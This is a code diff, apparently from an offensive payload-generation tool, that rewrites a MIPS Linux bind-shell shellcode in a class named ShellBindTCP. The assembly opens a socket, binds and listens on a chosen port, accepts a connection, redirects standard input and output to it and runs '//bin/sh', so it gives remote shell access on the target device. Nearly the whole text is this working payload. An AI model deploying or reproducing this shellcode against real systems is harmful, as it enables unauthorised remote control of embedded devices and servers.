@@ -45,70 +45,71 @@ class ShellBindTCP(HatAsm, HatVenom, Words):
 
         shellcode = f"""
         start:
-            addiu $sp, $sp, -32
-            li $t6, -3
-            nor $a0, $t6, $zero
-            nor $a1, $t6, $zero
+            addiu $sp, $sp, -0x20
+            addiu $t6, $zero, -3
+            not $a0, $t6
+            not $a1, $t6
             slti $a2, $zero, -1
-            li $v0, 4183
+            addiu $v0, $zero, 0x1057
             syscall 0x40404
 
             andi $s0, $v0, 0xffff
-            li $t6, -17
-            nor $t6, $t6, $zero
-            li $t5, -3
-            nor $t5, $t5, $zero
+            addiu $t6, $zero, -0x11
+            not $t6, $t6
+            addiu $t5, $zero, -3
+            not $t5, $t5
             sllv $t5, $t5, $t6
-            li $t6, 0x{bport.hex()}
+            addiu $t6, $zero, 0x{bport.hex()}
             or $t5, $t5, $t6
-            sw $t5, -32($sp)
-            sw $zero, -28($sp)
-            sw $zero, -24($sp)
-            sw $zero, -20($sp)
+            sw $t5, -0x20($sp)
+            sw $zero, -0x1c($sp)
+            sw $zero, -0x18($sp)
+            sw $zero, -0x14($sp)
             or $a0, $s0, $s0
-            li $t6, -17
-            nor $a2, $t6, $zero
-            addi $a1, $sp, -32
-            li $v0, 4169
+            addiu $t6, $zero, -0x11
+            not $a2, $t6
+            addi $a1, $sp, -0x20
+            addiu $v0, $zero, 0x1049
             syscall 0x40404
 
             or $a0, $s0, $s0
-            li $a1, 257
-            li $v0, 4174
+            addiu $a1, $zero, 0x101
+            addiu $v0, $zero, 0x104e
             syscall 0x40404
 
             or $a0, $s0, $s0
             slti $a1, $zero, -1
             slti $a2, $zero, -1
-            li $v0, 4168
+            addiu $v0, $zero, 0x1048
             syscall 0x40404
 
             sw $v0, -1($sp)
-            li $s1, -3
-            nor $s1, $s1, $zero
+            addiu $s1, $zero, -3
+            not $s1, $s1
             lw $a0, -1($sp)
 
         dup:
             move $a1, $s1
-            li $v0, 4063
+            addiu $v0, $zero, 0xfdf
             syscall 0x40404
 
-            li $s0, -1
+            addiu $s0, $zero, -1
             addi $s1, $s1, -1
             bne $s1, $s0, dup
+
             slti $a2, $zero, -1
             lui $t7, 0x2f2f
             ori $t7, $t7, 0x6269
-            sw $t7, -20($sp)
+            sw $t7, -0x14($sp)
             lui $t6, 0x6e2f
             ori $t6, $t6, 0x7368
-            sw $t6, -16($sp)
-            sw $zero, -12($sp)
-            addiu $a0, $sp, -20
+            sw $t6, -0x10($sp)
+            sw $zero, -0xc($sp)
+            addiu $a0, $sp, -0x14
             sw $a0, -8($sp)
             sw $zero, -4($sp)
             addiu $a1, $sp, -8
-            li $v0, 4011
+            addiu $v0, $zero, 0xfab
             syscall 0x40404
         """
 
